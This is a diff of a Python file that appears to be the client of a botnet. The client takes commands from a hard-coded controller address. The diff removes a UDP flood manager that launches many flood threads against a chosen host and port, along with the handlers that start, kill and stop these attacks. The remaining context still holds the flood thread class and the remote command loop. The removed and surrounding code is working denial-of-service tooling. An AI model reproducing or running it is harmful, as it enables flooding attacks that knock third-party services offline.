@@ -16,7 +16,6 @@ if os.name == "nt":
 else:
 	ENCODING = "utf-8"
 
-AUTHORIZATION = "" # (optnal) Set this to the authorization token you want to use
 MAX_CHUNK_SIZE = 16 * 1024 # 16KB
 POPEN_TIMEOUT = 60 # seconds
 
@@ -163,65 +162,6 @@ class UDPFlood(Thread):
 		self._closed = True
 		self.sock.close()
 
-
-class UDPFloodManager(Thread):
-	def __init__(self, parent:object, host:str, port:int, timeout:int, max_threads:int, hash:str):
-		self.parent = parent
-		self.host = host
-		self.port = port
-		self.timeout = timeout
-		self.max_threads = max_threads
-
-		self.task_hash = hash
-		self.run_until_local = True
-
-		self._closed = False
-
-		self.threads = []
-		self.total_sent = 0
-
-		super().__init__()
-	
-	def run_until_fn(self):
-		if not self.run_until_local:
-			return self.run_until_local
-		
-		if not self.parent.tasks.get(self.task_hash):
-			return False
-
-		return self.parent.tasks[self.task_hash].get("run")
-
-	def update_data(self, n:int):
-		self.total_sent += n
-
-	def run(self):
-		logg.debug(f"Starting UDPFloodManager for {self.host}:{self.port}")
-		for _ in range(self.max_threads):
-			thread = UDPFlood(self.host, self.port, self.timeout, self.update_data, self.run_until_fn)
-			thread.start()
-			self.threads.append(thread)
-
-		current_loop = 0
-		sleep_duration = 0.01
-		max_loop = self.timeout / sleep_duration
-
-		while current_loop <= max_loop:
-			if not self.run_until_local:
-				logg.debug("Stopping UDPFloodManager")
-				break
-			sleep(sleep_duration)
-			current_loop += 1
-
-		self.close()
-
-	def close(self):
-		logg.debug("Closing UDPFloodManager")
-		self._closed = True
-		self.run_until = False
-		
-		self.parent.tasks.pop(self.task_hash, None)
-
-
 class Client():
 	def __init__(self, addr:Tuple[str,int]=("10.64.18.2",8267)) -> None:
 		signal.signal(signal.SIGINT, self.exit_gracefully)
@@ -326,45 +266,9 @@ class Client():
 		else:
 			print("Invalid command")
 	
-	def direct_attack(self, ack:str, params:str) -> None:
-		host, port, timeout, threads = params
-
-		port = int(port)
-		timeout = int(timeout)
-		threads = int(threads)
-
-		hash = self.get_hash("ATTACK", params)
-
-		self.tasks[hash] = dict(run=True)
-
-		manager = UDPFloodManager(self, host, port, timeout, threads, hash)
-		manager.start()
-
-		self.tasks[hash]["manager"] = manager
-
-		if ack:
-			self.send(Request("Task started successfully {}".format(hash)))
-	
 	def direct_ping(self, ack:str, params:str) -> None:
 		if ack:
 			self.send(Request("Pong"))
-	
-	def direct_kill(self, ack:str, params:str) -> None:
-		hash = int(params[0])
-		if hash in self.tasks:
-			self.tasks[hash]["manager"].run_until_local = False
-			if ack:
-				self.send(Request("Task killed successfully {}".format(hash)))
-		else:
-			if ack:
-				self.send(Request("Task not found {}".format(hash)))
-	
-	def direct_stop(self, ack:str, params:str) -> None:
-		for hash in self.tasks:
-			self.tasks[hash]["manager"].run_until_local = False
-		
-		if ack:
-			self.send(Request("All tasks killed successfully"))
 
 	def direct_destroy(self, ack:str, params:str) -> None:
 		for hash in self.tasks:
